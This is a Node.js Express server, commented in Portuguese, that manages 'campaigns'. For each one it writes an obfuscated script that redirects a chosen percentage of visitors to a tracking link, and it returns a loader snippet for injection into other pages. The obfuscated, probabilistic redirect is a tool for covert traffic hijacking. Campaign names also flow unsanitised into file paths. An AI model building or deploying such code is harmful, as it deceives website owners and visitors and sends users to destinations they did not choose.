const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const path = require('path');
const obfuscator = require('javascript-obfuscator');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// 🔹 Criar diretórios `public/scripts` e `public/campanha` se não existirem
const scriptsDir = path.join(__dirname, 'public/scripts');
const campaignsDir = path.join(__dirname, 'public/campanha');

[scriptsDir, campaignsDir].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// 🔹 Página principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/dashboard.html'));
});

// 🔹 Conectar ao banco de dados SQLite
const db = new sqlite3.Database('./campaigns.db', (err) => {
    if (err) {
        console.error('❌ Erro ao conectar ao banco de dados', err);
    } else {
        console.log('✅ Conectado ao banco de dados SQLite');
        db.run(`CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL UNIQUE,
            trackingLink TEXT NOT NULL,
            percentage INTEGER NOT NULL
        )`);
    }
});

// 🔹 Rota para listar campanhas
app.get('/campaigns', (req, res) => {
    db.all('SELECT * FROM campaigns', [], (err, rows) => {
        if (err) {
            res.status(500).json({ error: err.message });
        } else {
            res.json(rows);
        }
    });
});

// 🔹 Rota para adicionar uma nova campanha
app.post('/campaigns', (req, res) => {
    const { name, trackingLink, percentage } = req.body;
    const slug = name.toLowerCase().replace(/\s+/g, '-');

    db.run(
        "INSERT INTO campaigns (name, trackingLink, percentage) VALUES (?, ?, ?)",
        [name, trackingLink, percentage],
        function (err) {
            if (err) {
                res.status(500).json({ error: err.message });
            } else {
                const campaignId = this.lastID;
                console.log(`✅ Campanha "${name}" cadastrada com sucesso!`);

                let rawScript = `
                    if (Math.random() * 100 < ${percentage}) {
                        window.location.href = "${trackingLink}";
                    }
                `;

                // 🔹 Ofuscar o script
                const obfuscatedScript = obfuscator.obfuscate(rawScript, {
                    compact: true,
                    controlFlowFlattening: true,
                }).getObfuscatedCode();

                // 🔹 Criar script encurtado no formato exigido
                let shortScript = `
                    (function(){
                        var s = document.createElement("script");
                        s.async = true;
                        s.src = (document.location.protocol == "https:" ? "https:" : "http:") + "//" + location.host + "/scripts/${slug}.js";
                        var a = document.getElementsByTagName("script")[0];
                        a.parentNode.insertBefore(s, a);
                    })();
                `;

                // 🔹 Salvar script ofuscado no servidor
                const scriptPath = path.join(scriptsDir, `${slug}.js`);
                fs.writeFile(scriptPath, obfuscatedScript, (err) => {
                    if (err) {
                        console.error("❌ Erro ao criar script da campanha:", err);
                    } else {
                        console.log("✅ Script de redirecionamento criado:", scriptPath);
                    }
                });

                res.json({ id: campaignId, name, trackingLink, percentage, slug, shortScript });
            }
        }
    );
});

// 🔹 Rota protegida para servir os scripts
app.get('/scripts/:slug.js', (req, res) => {
    const { slug } = req.params;
    const scriptPath = path.join(scriptsDir, `${slug}.js`);

    if (fs.existsSync(scriptPath)) {
        res.setHeader("Content-Type", "application/javascript");
        res.sendFile(scriptPath);
    } else {
        res.status(404).send("Script não encontrado");
    }
});

// 🔹 Rota para excluir campanha
app.delete('/campaigns/:id', (req, res) => {
    const campaignId = req.params.id;

    db.get("SELECT name FROM campaigns WHERE id = ?", [campaignId], (err, row) => {
        if (err || !row) {
            return res.status(404).json({ error: "Campanha não encontrada!" });
        }

        const slug = row.name.toLowerCase().replace(/\s+/g, '-');
        const scriptPath = path.join(scriptsDir, `${slug}.js`);

        db.run("DELETE FROM campaigns WHERE id = ?", [campaignId], (err) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }

            console.log(`❌ Campanha "${row.name}" removida do banco de dados.`);

            if (fs.existsSync(scriptPath)) {
                fs.unlinkSync(scriptPath);
                console.log(`✅ Script removido: ${scriptPath}`);
            }

            res.json({ success: true, message: "Campanha excluída com sucesso!" });
        });
    });
});

// 🔹 Iniciar o servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
